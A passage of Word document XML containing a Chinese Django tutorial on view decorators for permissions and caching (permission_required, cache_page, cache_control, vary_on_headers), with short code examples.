      </w:r>
    </w:p>
    <w:p w14:paraId="5AA87727" w14:textId="2578F33F" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BF00330"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django.contrib.auth.decorators import permission_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B7111F" w14:textId="428201F0" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61DCEBB4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@permission_required('polls.can_vote', login_url='/login/')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE338C8"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37188D15" w14:textId="734B5405" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E928A8" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>更多Django权限介绍见</w:t>
      </w:r>
      <w:hyperlink r:id="rId296" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(23): 权限管理(permissions)与用户组(group)详解</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="62C9A08D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C213429" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF87A12" w14:textId="087F8F56" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>缓存是Django装饰器很重要的一个应用场景。下面我们来看几个主要的缓存装饰器。注意: 使用以下装饰器的前提是你已经对缓存进行了相关设置（见</w:t>
      </w:r>
      <w:hyperlink r:id="rId297" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(8): 缓存Cache应用场景及工作原理，Cache设置及如何使用</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE22DE1" w14:textId="470618F6" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F0716B6" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@cache_page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DFF1544" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>该装饰器可以接收缓存的时间作为参数，比如下例缓存页面15分钟。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDFA0AD"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django.views.decorators.cache import cache_page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0723F7ED" w14:textId="0A6FE32D" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="191F687A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@cache_page(60 * 15)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107576E8"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09EAE1F1" w14:textId="64F7C60B" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12EA9FCA" w14:textId="055F4CC5" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E00B590" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@cache_control</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C424376" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>通常用户将会面对两种缓存： 他或她自己的浏览器缓存（私有缓存）以及他或她的提供者缓存（公共缓存）。 公共缓存由多个用户使用，而受其它人的控制。 这就产生了你不想遇到的敏感数据的问题，比如说你的银行账号被存储在公众缓存中。 因此，Web 应用程序需要以某种方式告诉缓存那些数据是私有的，哪些是公共的。cache_control 装饰器可以解决这个问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6522B9CA" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2729E00F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.decorators.cache import cache_control</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758574D5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79E0059F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@cache_control(private=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AAAF53F"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003E75DE" w14:textId="22448B91" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t># ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773C864F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>该修饰器负责在后台发送相应的 HTTP 头部。还有一些其他方法可以控制缓存参数。 例如, HTTP 允许应用程序执行如下操作:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F97B89" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    定义页面可以被缓存的最大时间。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FBA416" w14:textId="4674C392" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    指定某个缓存是否总是检查较新版本，仅当无更新时才传递所缓存内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D28DC6" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在 Django 中，可使用 cache_control 视图修饰器指定这些缓存参数。 在下例中， cache_control 告诉缓存对每次访问都重新验证缓存并在最长 3600 秒内保存所缓存版本。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C95BE18"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django.views.decorators.cache import cache_control</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77AA7E66" w14:textId="4B8F34DF" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77857863" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@cache_control(must_revalidate=True, max_age=3600)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D37F1E2"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62C00D88" w14:textId="56686001" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD40B9F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在 cache_control() 中，任何合法的Cache-Control HTTP 指令都是有效的。下面是完整列表：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DCEBE35" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>public=True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F63E360" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>private=True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEF980C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>no_cache=True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2616B7E9" w14:textId="66475E0A" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F7AA404" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>no_transform=True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509A3DE9" w14:textId="34A8EC36" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BD90084" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>must_revalidate=True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4845EC6F" w14:textId="2EF30379" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D8C4188" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>proxy_revalidate=True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48BAC4C4" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>max_age=num_seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401B5C2F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>s_maxage=num_seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74AC4DC3" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1130381D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@vary_on_headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E57732" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>缺省情况下，Django 的缓存系统使用所请求的路径(如blog/article/1)来创建其缓存键。这意味着不同用户请求同样路径都会得到同样的缓存版本，不考虑客户端user-agent, cookie和语言配置的不同, 除非你使用Vary头部通知缓存机制需要考虑请求头里的cookie和语言的不同。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1A77A7" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="216D2E3E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>要在 Django 完成这项工作，可使用便利的 vary_on_headers 视图装饰器。例如下面代码告诉Django读取缓存数据时需要同时考虑User-Agent和Cookie的不同。与此类似的装饰器还有@vary_on_cookie。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660200E8" w14:textId="30ED339C" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.decorators.vary import vary_on_headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3BFDB8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@vary_on_headers('User-Agent', 'Cookie')</w:t>
      </w:r>
    </w:p>
